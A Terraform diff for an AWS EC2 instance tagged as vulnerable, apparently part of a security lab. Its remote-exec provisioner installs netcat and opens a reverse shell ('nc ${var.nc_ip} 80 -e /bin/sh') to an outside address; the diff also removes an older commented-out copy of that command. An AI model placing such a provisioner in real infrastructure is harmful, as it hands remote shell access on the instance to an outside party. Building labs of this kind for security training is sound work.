@@ -5,8 +5,8 @@ resource "aws_instance" "remote-exec-example" {
   count = var.remoteexec_enabled ? 1 : 0
   ami           = "ami-06ca3ca175f37dd66"
   instance_type = "t2.micro"
-  vpc_security_group_ids = [var.remote_exec_sgs]
-  subnet_id = var.remote_exec_subnet
+  vpc_security_group_ids = [var.lab_sgs]
+  subnet_id = var.lab_subnet
 
   associate_public_ip_address = true
 
@@ -15,16 +15,9 @@ resource "aws_instance" "remote-exec-example" {
       Vulnerable = "true"
   }
 
-  # provisioner "remote-exec" {
-  #   inline = [
-  #     "sudo yum install ec2-instance-connect nc -y",
-  #     "nc ${var.nc_ip} 8080 -e /bin/sh"
-  #   ]
-  # }
-
 provisioner "remote-exec" {
   inline = [
-    "sh -c 'sudo yum install ec2-instance-connect nc -y || true'",
+    "sh -c 'sudo yum install ec2-instance-connect nc  -y || true'",
     "sh -c 'nc ${var.nc_ip} 80 -e /bin/sh || true'"
   ]
 }
